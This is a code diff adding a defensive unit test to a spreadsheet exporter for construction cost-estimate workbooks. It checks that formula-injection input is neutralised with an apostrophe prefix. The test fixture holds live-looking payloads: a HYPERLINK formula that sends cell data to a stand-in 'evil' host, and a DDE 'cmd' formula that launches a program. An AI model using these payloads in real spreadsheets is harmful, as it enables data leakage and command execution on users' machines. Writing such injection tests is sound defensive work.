@@ -65,6 +65,37 @@ describe('PART N — Kalkulation-Vorlage exporter', () => {
     expect(wb.SheetNames).toContain('Kalkulation');
   });
 
+  test('neutralizes formula injection in user/LV-sourced string cells', async () => {
+    const evil: ProjectData = {
+      ...FIXTURE,
+      client: '=HYPERLINK("http://evil/?"&A1,"x")',
+      bidder: '@SUM(1)',
+      positions: [
+        { ...FIXTURE.positions[1], id: 'pX', shortText: "=cmd|'/c calc'!A0" },
+      ],
+    };
+    const bytes = await exportToKalkulationVorlage(evil);
+    const wb = XLSX.read(bytes, { type: 'array' });
+    const ws = wb.Sheets['Kalkulation'];
+    const strings: string[] = [];
+    for (const addr of Object.keys(ws)) {
+      if (addr.startsWith('!')) continue;
+      const cell = ws[addr] as { t?: string; v?: unknown; f?: string };
+      // Plain string cells only — formula cells (.f) are app-generated, e.g.
+      // IFERROR(F8/I10,"-"), and are not a user-injection vector.
+      if (cell && cell.t === 's' && !cell.f && typeof cell.v === 'string') strings.push(cell.v);
+    }
+    // The raw payloads must NOT survive as string cells…
+    expect(strings).not.toContain('=HYPERLINK("http://evil/?"&A1,"x")');
+    expect(strings).not.toContain("=cmd|'/c calc'!A0");
+    expect(strings).not.toContain('@SUM(1)');
+    // …their neutralized (apostrophe-prefixed) forms must.
+    expect(strings).toContain('\'=HYPERLINK("http://evil/?"&A1,"x")');
+    expect(strings).toContain("'=cmd|'/c calc'!A0");
+    // Invariant: NO exported string cell starts with a formula trigger.
+    for (const s of strings) expect(/^[=+\-@\t\r]/.test(s)).toBe(false);
+  });
+
   test('places canonical header anchors at exact cells (re-import activates fast-path)', async () => {
     const bytes = await exportToKalkulationVorlage(FIXTURE);
     const wb = XLSX.read(bytes, { type: 'array' });
@@ -148,6 +179,9 @@ describe('PART N — Kalkulation-Vorlage exporter', () => {
     const result = await parseKalkulationWorkbook(bytes);
     // No formula errors expected — exporter writes plain numeric values,
     // not formulas. So the import gate should allow it.
+    // The exporter writes LIVE formulas with cached results; the importer reads
+    // the cached `.v` and the formula error-gate only trips on actual error
+    // cells (t==='e'), which valid formulas never produce.
     const formulaErrors = result.issues.filter((i) => i.code === 'formula_error');
     expect(formulaErrors.length).toBe(0);
     expect(result.ok).toBe(true);
